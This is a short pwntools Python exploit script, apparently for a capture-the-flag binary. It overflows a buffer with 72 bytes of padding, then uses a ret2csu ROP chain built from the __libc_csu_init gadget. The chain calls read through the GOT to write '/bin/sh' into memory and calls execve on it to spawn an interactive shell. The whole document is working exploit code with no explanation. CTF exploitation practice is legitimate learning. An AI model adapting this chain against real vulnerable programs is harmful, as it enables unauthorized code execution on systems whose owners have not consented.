from pwn import *
#context.log_level = 'debug'

binary = ELF('./bin')
def csu_init_rop(addr,argv):
    rop = ""
    rop += 'a'*8            #padding
    rop += p64(0)           #rbx
    rop += p64(1)           #rbp (make rbx+1 == rbp)
    rop += p64(addr)        #r12 (call address)
    rop += p64(argv[2])     #r13 (rdx argv3)
    rop += p64(argv[1])     #r14 (rsi argv2)
    rop += p64(argv[0])     #r15 (rdi argv1)
    rop += p64(0x400870)    #magic address
    return rop

t = process('./bin')

t.recvline()
t.recvline()
t.recvline()
stdin = constants.linux.amd64.STDIN_FILENO

rop = p64(0x400886)
rop += csu_init_rop(binary.got['read'],[stdin, 0x601048, 8])
rop += csu_init_rop(binary.got['execve'], [0x601048, 0, 0])

#gdb.attach(t)
raw_input()
t.sendline('a'*72 + rop)
t.recvline()
t.send('/bin/sh')

t.interactive()
